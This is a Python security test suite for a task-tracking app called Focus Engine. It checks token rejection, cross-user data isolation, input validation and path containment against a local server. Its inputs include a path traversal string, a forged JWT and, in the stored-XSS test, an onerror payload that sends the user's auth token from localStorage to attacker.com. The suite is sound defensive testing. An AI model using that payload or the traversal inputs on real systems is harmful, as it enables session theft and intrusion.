"""
scripts/security_audit_test.py
Automated Security Audit Test Suite:
1. Unauthorized access (Missing credentials -> 401)
2. Invalid token signature / tampered payload -> 401
3. Cross-User Data Isolation / Horizontal IDOR protection
4. Input validation: Malformed ntfy_topic -> 422
5. Path traversal / Dangerous root workspace path containment
6. XSS payload handling & HTML sanitization
"""
import json
import os
import sys
import uuid
import urllib.request
import urllib.error
from pathlib import Path

# Ensure project root is in sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

BASE_URL = "http://127.0.0.1:8000"

def make_req(endpoint, method="GET", data=None, token=None):
    url = f"{BASE_URL}{endpoint}"
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode("utf-8") if data is not None else None
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as resp:
            status_code = resp.status
            content = resp.read().decode("utf-8")
            try:
                res_json = json.loads(content)
            except Exception:
                res_json = content
            return status_code, res_json
    except urllib.error.HTTPError as e:
        err_body = e.read().decode("utf-8")
        try:
            err_json = json.loads(err_body)
        except Exception:
            err_json = err_body
        return e.code, err_json

def run_security_tests():
    print("=" * 65)
    print("FOCUS ENGINE — AUTOMATED APPLICATION SECURITY TEST SUITE")
    print("=" * 65)

    # -------------------------------------------------------------
    # Test 1: Unauthorized Access (Missing Credentials)
    # -------------------------------------------------------------
    print("\n[TEST 1] Unauthorized Access with Missing Credentials")
    status, res = make_req("/tasks", method="GET")
    print(f"    GET /tasks without token -> Status {status}")
    assert status == 401, f"Expected 401 Unauthorized, got {status}"
    print("    [PASS] Unauthenticated access properly rejected with 401.")

    # -------------------------------------------------------------
    # Test 2: Tampered / Forged Token Signature
    # -------------------------------------------------------------
    print("\n[TEST 2] Tampered Token Signature Verification")
    tampered_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhdXRoZW50aWNhdGVkIn0.invalid_signature_hash_xyz"
    status, res = make_req("/tasks", method="GET", token=tampered_token)
    print(f"    GET /tasks with forged signature -> Status {status}")
    assert status == 401, f"Expected 401 Unauthorized, got {status}"
    print("    [PASS] Forged / tampered signature properly rejected with 401.")

    # -------------------------------------------------------------
    # Test 3: Account Registration & Clean-Slate Setup
    # -------------------------------------------------------------
    print("\n[TEST 3] Registering Two Distinct Isolated Accounts (Alice & Bob)")
    user_a_email = f"alice_{uuid.uuid4().hex[:6]}@focusengine.test"
    user_b_email = f"bob_{uuid.uuid4().hex[:6]}@focusengine.test"
    pwd = "SecurePassword123!"

    status_a, res_a = make_req("/api/auth/signup", method="POST", data={"email": user_a_email, "password": pwd})
    assert status_a == 201, f"Failed creating Alice: {res_a}"
    token_a = res_a["access_token"]
    user_a_id = res_a["user_id"]
    print(f"    Alice registered: {user_a_email} (ID: {user_a_id})")

    status_b, res_b = make_req("/api/auth/signup", method="POST", data={"email": user_b_email, "password": pwd})
    assert status_b == 201, f"Failed creating Bob: {res_b}"
    token_b = res_b["access_token"]
    user_b_id = res_b["user_id"]
    print(f"    Bob registered:   {user_b_email} (ID: {user_b_id})")
    assert user_a_id != user_b_id, "User IDs must be distinct"
    print("    [PASS] Two clean-slate accounts initialized.")

    # -------------------------------------------------------------
    # Test 4: Cross-User IDOR / Tenant Data Isolation
    # -------------------------------------------------------------
    print("\n[TEST 4] Horizontal IDOR & Cross-User Isolation")
    # Alice creates a private task
    task_payload = {
        "title": "Alice Confidential System Design",
        "category": "coding",
        "priority": 1,
        "estimated_duration_min": 50,
        "min_goal": 25,
        "target_goal": 50,
        "stretch_goal": 75,
    }
    status_t, res_t = make_req("/tasks", method="POST", data=task_payload, token=token_a)
    assert status_t == 201, f"Alice task creation failed: {res_t}"
    alice_task_id = res_t["id"]
    print(f"    Alice created task: {alice_task_id}")

    # Bob lists tasks: must NOT contain Alice's task
    status_bl, res_bl = make_req("/tasks", method="GET", token=token_b)
    assert status_bl == 200
    bob_task_ids = [t["id"] for t in res_bl]
    assert alice_task_id not in bob_task_ids, "CRITICAL: Bob was able to see Alice's task in task list!"
    print("    [PASS] Alice's task is invisible in Bob's task list.")

    # Bob attempts to start a session referencing Alice's task
    start_payload = {"task_id": alice_task_id}
    status_bs, res_bs = make_req("/sessions/start", method="POST", data=start_payload, token=token_b)
    print(f"    Bob start session on Alice's task -> Status {status_bs}")
    assert status_bs in (404, 403), f"Expected 404/403 for unauthorized task, got {status_bs}"
    print("    [PASS] Cross-user task hijack prevented with 404/403.")

    # Alice starts a session
    status_as, res_as = make_req("/sessions/start", method="POST", data=start_payload, token=token_a)
    assert status_as == 201
    alice_session_id = res_as["id"]

    # Bob attempts to end Alice's session
    status_be, res_be = make_req(f"/sessions/{alice_session_id}/end", method="POST", data={"notes": "Bob attack"}, token=token_b)
    print(f"    Bob attempt to end Alice's session -> Status {status_be}")
    assert status_be in (404, 403), f"Expected 404/403 for unauthorized session end, got {status_be}"
    print("    [PASS] Cross-user session termination prevented with 404/403.")

    # Bob attempts to request viva on Alice's session
    status_bv, res_bv = make_req(f"/sessions/{alice_session_id}/request-viva", method="POST", data={"proof_text": "Fake proof"}, token=token_b)
    assert status_bv in (404, 403)
    print("    [PASS] Cross-user viva submission prevented with 404/403.")

    # -------------------------------------------------------------
    # Test 5: Input Validation & Pattern Enforcement (ntfy_topic)
    # -------------------------------------------------------------
    print("\n[TEST 5] Input Validation: Malicious/Malformed ntfy_topic")
    malicious_topics = [
        "../../etc/passwd",
        "topic with spaces",
        "topic?param=val",
        "bad#hash",
        "a",  # too short (<3)
    ]
    for bad_topic in malicious_topics:
        status_bad, res_bad = make_req("/api/settings", method="PUT", data={"ntfy_topic": bad_topic}, token=token_a)
        print(f"    PUT /api/settings with topic '{bad_topic}' -> Status {status_bad}")
        assert status_bad == 422, f"Expected 422 Unprocessable Entity for invalid topic '{bad_topic}', got {status_bad}"
    print("    [PASS] Malformed ntfy_topic rejected by Pydantic schema validation.")

    # -------------------------------------------------------------
    # Test 6: Path Traversal & Root Directory Containment
    # -------------------------------------------------------------
    print("\n[TEST 6] Path Traversal & Dangerous Root Workspace Directory Containment")
    from app.watchdogs.git_guard import check_workspace_activity
    dangerous_paths = ["/", "C:\\", "C:\\Windows", "C:\\Windows\\System32"]
    for dp in dangerous_paths:
        res = check_workspace_activity(target_dir=dp)
        print(f"    check_workspace_activity on '{dp}' -> has_activity={res.get('has_activity')}")
        assert res.get("has_activity") is False, f"Expected False for dangerous path {dp}"
        assert "restricted" in res.get("summary", "").lower() or "invalid" in res.get("summary", "").lower()
    print("    [PASS] Dangerous root paths safely trapped and contained.")

    # -------------------------------------------------------------
    # Test 7: Stored XSS Payload Handling
    # -------------------------------------------------------------
    print("\n[TEST 7] Stored XSS Payload Storage & JSON Escaping")
    xss_payload = '<script>alert("XSS")</script><img src=x onerror=fetch("http://attacker.com/"+localStorage.getItem("focus_auth_token"))>'
    status_x, res_x = make_req("/tasks", method="POST", data={
        "title": xss_payload,
        "category": "writing",
        "priority": 2,
        "estimated_duration_min": 30,
        "min_goal": 15,
        "target_goal": 30,
        "stretch_goal": 45,
    }, token=token_a)
    assert status_x == 201
    print(f"    Task created with XSS string payload: id={res_x['id']}")
    # Retrieve tasks - verify JSON string encoding is intact
    status_rx, res_rx = make_req("/tasks", method="GET", token=token_a)
    assert status_rx == 200
    stored_task = next(t for t in res_rx if t["id"] == res_x["id"])
    assert stored_task["title"] == xss_payload
    print("    [PASS] Raw payload safely stored in parameterized DB without execution.")

    print("\n" + "=" * 65)
    print("ALL 7 SECURITY TESTS EXECUTED AND PASSED SUCCESSFULLY!")
    print("=" * 65)

if __name__ == "__main__":
    run_security_tests()
